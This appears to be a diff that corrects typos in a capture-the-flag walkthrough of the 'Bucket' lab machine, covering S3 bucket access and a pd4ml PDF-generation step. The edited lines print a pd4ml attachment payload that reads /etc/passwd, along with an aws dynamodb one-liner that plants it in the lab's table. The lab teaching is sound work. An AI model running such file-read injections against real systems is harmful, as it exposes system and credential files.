@@ -165,7 +165,7 @@ And if we add the `--recursive` flag, we can see the files inside the `"images"`
 
 <br />
 
-Cool, we have `access` to the bucket and we can `list` it contents.
+Cool, we have `access` to the bucket and we can `list` its contents.
 
 What if we try to `upload` something?
 
@@ -516,7 +516,7 @@ drwxr-x---+ 10 root root   4096 Feb 10  2021 vendor
 
 <br />
 
-At the top of `"index.php"`, we found an interesing code:
+At the top of `"index.php"`, we found an interesting code:
 
 <br />
 
@@ -659,14 +659,14 @@ Yes! Let's see its content:
 
 <br />
 
-While reading about the different `pdf4ml` functionalities, we found a really interesting one that allows us to `embed` a Linux `file` into the PDF.
+While reading about the different `pdf4ml` functionalities, we found a really interesting one that allows us to `include` files from the local filesystem.
 
 The syntax to do that is this:
 
 <br />
 
 ```bash
-<pd4ml:attachment description=\"Testing to hard\" src=\"file://etc/passwd\"></pd4ml:attachment>"
+<pd4ml:attachment description=\"Testing too hard\" src=\"file://etc/passwd\"></pd4ml:attachment>"
 ```
 
 <br />
@@ -676,7 +676,7 @@ After including this `payload` in our oneliner, we can repeat the process:
 <br />
 
 ```bash
-aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --table-class STANDARD --endpoint-url=http://s3.bucket.htb --output=json && aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"Testing to hard\" src=\"file:/etc/passwd\"></pd4ml:attachment>"}}' --endpoint-url http://s3.bucket.htb --output json
+aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --table-class STANDARD --endpoint-url=http://s3.bucket.htb --output=json && aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"Testing too hard\" src=\"file:/etc/passwd\"></pd4ml:attachment>"}}' --endpoint-url http://s3.bucket.htb --output json
 ```
 
 <br />
